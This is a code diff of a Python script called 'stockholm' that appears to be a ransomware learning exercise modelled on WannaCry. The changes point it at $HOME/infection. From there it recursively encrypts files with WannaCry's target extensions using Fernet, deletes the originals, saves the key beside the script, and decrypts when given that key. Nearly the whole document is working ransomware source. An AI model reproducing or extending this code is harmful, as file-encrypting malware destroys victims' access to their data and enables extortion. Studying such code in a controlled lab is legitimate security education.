@@ -1,19 +1,27 @@
+#! /usr/bin/python3
+
 import argparse
 import os, sys
 from os.path import isdir
 from cryptography.fernet import Fernet
 from pathlib import Path
 
+INFECT_FOLDER_NAME = "infection"
+ENCRYPTED_EXT = ".ft"
+
+STOCKHOLM_LOCATION = Path(__file__).resolve().parent
+# BASE_INFECT_FOLDER = f"{STOCKHOLM_LOCATION}/{INFECT_FOLDER_NAME}" # REMOVE FOR FINAL VERSION
+BASE_INFECT_FOLDER = f"{Path.home()}/{INFECT_FOLDER_NAME}" # ENABLE FOR FINAL VERSION
+
 
 def parser():
     parser = argparse.ArgumentParser(
         prog='stockholm',
-        description='Surprise jiji'
+        description='Encrypt all files in $HOME/infection'
     )
     parser.add_argument(
-        '-v',
-        dest='version',
-        default="1.0",
+        '-v', '--version',
+        default=False, action='store_true',
         help="shows program version.",
     )
     parser.add_argument(
@@ -30,17 +38,41 @@ def parser():
     return parser.parse_args()
 
 
-INFECT_FOLDER_NAME = "infection"
-ENCRYPTED_EXT = ".ft"
+args = parser()
 
-STOCKHOLM_LOCATION = Path(__file__).resolve().parent
-BASE_INFECT_FOLDER = f"{STOCKHOLM_LOCATION}/{INFECT_FOLDER_NAME}" # REMOVE FOR FINAL VERSION
-# BASE_INFECT_FOLDER = f"{Path.home()}/{INFECT_FOLDER_NAME}" # ENABLE FOR FINAL VERSION
+SILENT_MODE = args.silent
+DECRYPT_KEY = args.key
+SHOWS_VERSION = args.version
 
 
-def backup_key(key):
-    with open(f"{STOCKHOLM_LOCATION}/stockholm.key", 'wb') as backup_key:
-        backup_key.write(key)
+if SHOWS_VERSION:
+    print("stockholm v1.0")
+    exit(0)
+
+if SILENT_MODE == True:
+    file_devnull = open(os.devnull, 'w')
+    sys.stdout = file_devnull
+
+
+def backup_key():
+    try:
+        with open(f"{STOCKHOLM_LOCATION}/stockholm.key", 'wb') as backup_key:
+            backup_key.write(DECRYPT_KEY)
+    except Exception as e:
+        print(f"Error: {e}")
+        exit(1)
+
+
+if not DECRYPT_KEY:
+    DECRYPT_KEY = Fernet.generate_key()
+    backup_key()
+
+
+try:
+    FERNET = Fernet(DECRYPT_KEY)
+except Exception as e:
+    print(f"Error: {e}")
+    exit(1)
 
 
 WANNACRY_TARGETS = [
@@ -61,77 +93,57 @@ WANNACRY_TARGETS = [
     ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc",
 ]
 
-def encrypt_file(file_path:str, file:str):
+def encrypt_file(file_path:str):
     extension = Path(file_path).suffix
     if extension not in WANNACRY_TARGETS:
         return
-    with open(file_path, 'rb') as file_read:
-        raw_data = file_read.read()
-    with open(file_path+ENCRYPTED_EXT, 'wb') as file_write:
-        file_write.write(f.encrypt(raw_data))
-    print(f"Encrypted -> {file}")
-    os.remove(file_path)
-
+    try:
+        with open(file_path, 'rb') as file_read:
+            raw_data = file_read.read()
+        with open(file_path+ENCRYPTED_EXT, 'wb') as file_write:
+            file_write.write(FERNET.encrypt(raw_data))
+        print(f"Encrypted -> {file_path}")
+        os.remove(file_path)
+    except Exception as e:
+        print(f"Error: {e}")
+        exit(1)
 
 def encrypt_folder(folder_name:str=BASE_INFECT_FOLDER):
-    print(f"---- {folder_name} ----")
-
     files = os.listdir(folder_name)
     for file in files:
         file_path = folder_name + "/" + file
         if isdir(file_path):
-            # print(f"_dir: {file}")
             encrypt_folder(file_path)
         else:
-            # print(f"_file: {file}")
-            encrypt_file(file_path, file)
+            encrypt_file(file_path)
 
 
-def decrypt_file(file_path:str, file:str):
+def decrypt_file(file_path:str):
     extension = Path(file_path).suffix
-    if extension == ENCRYPTED_EXT:
-        with open(file_path, 'rb') as file_read:
-            raw_data = file_read.read()
-        with open(file_path.removesuffix(ENCRYPTED_EXT), 'wb') as file_write:
-            file_write.write(f.decrypt(raw_data))
-        print(f"Decrypted -> {file}")
-        os.remove(file_path)
+    try:
+        if extension == ENCRYPTED_EXT:
+            with open(file_path, 'rb') as file_read:
+                raw_data = file_read.read()
+            with open(file_path.removesuffix(ENCRYPTED_EXT), 'wb') as file_write:
+                file_write.write(FERNET.decrypt(raw_data))
+            print(f"Decrypted -> {file_path}")
+            os.remove(file_path)
+    except Exception as e:
+        print(f"Error: {e}")
 
 
 def decrypt_folder(folder_name:str=BASE_INFECT_FOLDER):
-    print(f"---- {folder_name} ----")
-
     files = os.listdir(folder_name)
     for file in files:
         file_path = folder_name + "/" + file
         if isdir(file_path):
-            # print(f"_dir: {file}")
             decrypt_folder(file_path)
         else:
-            # print(f"_file: {file}")
-            decrypt_file(file_path, file)
+            decrypt_file(file_path)
+
 
 if __name__ == '__main__':
-    global args
-    args = parser()
-
-    if args.silent == True:
-        file_devnull = open(os.devnull, 'w')
-        sys.stdout = file_devnull
-        # sys.stderr = file_devnull
-
-    global key
-    global f
-
-    if args.key is not None:
-        key = args.key
-    else:
-        key = Fernet.generate_key()
-        backup_key(key)
-
-    f = Fernet(key)
-    
-    if args.key is not None:
+    if args.key:
         decrypt_folder()
     else:
         encrypt_folder()
